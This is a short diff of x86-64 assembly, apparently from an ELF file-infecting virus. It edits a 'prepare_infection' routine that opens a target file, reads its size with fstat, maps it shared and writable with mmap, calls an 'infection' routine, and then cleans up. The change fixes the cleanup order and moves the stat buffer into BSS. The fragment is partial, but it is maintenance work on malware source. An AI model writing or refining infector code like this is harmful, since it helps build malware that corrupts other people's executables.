@@ -626,17 +626,15 @@ prepare_infection:
 
 	; fstat(fd, &stat)
 	mov     rdi, r12
-	sub     rsp, 144
 	mov     rax, SYS_fstat
-	mov     rsi, rsp
+	lea     rsi, [stack]
 	syscall
 	cmp     rax, 0
-	jl     .close_file
+	jl     .close_file_nomap
 
 	; save file size
-	mov     rax, [rsp + 48]
+	mov     rax, [stack + 48]
 	mov     [rel file_size], rax
-	add     rsp, 144
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
 	mov		rax, [rel file_size]
@@ -650,7 +648,7 @@ prepare_infection:
 	xor     r9, r9
 	syscall
 	cmp     rax, -4095
-	jae     .close_file
+	jae     .close_file_nomap
 
 	mov r14, rax
 
@@ -694,12 +692,13 @@ prepare_infection:
 	call	infection
 
 	.close_file:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
 		mov		rax, SYS_munmap
 		mov		rdi, r14
 		mov		rsi, [rel file_size]
+		syscall
+	.close_file_nomap:
+		mov		rax, SYS_close
+		mov		rdi, r12
 		syscall
 	.return:
 		POP_ALL
@@ -1211,6 +1210,7 @@ new_programheader:
 buffer_bss:
 	padd	times 4096 db 0
 	buff	times 4096 db 0
+	stack	times 0144 db 0
 	elfp0	times 0056 db 0
 	elfp1	times 0056 db 0
 	buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
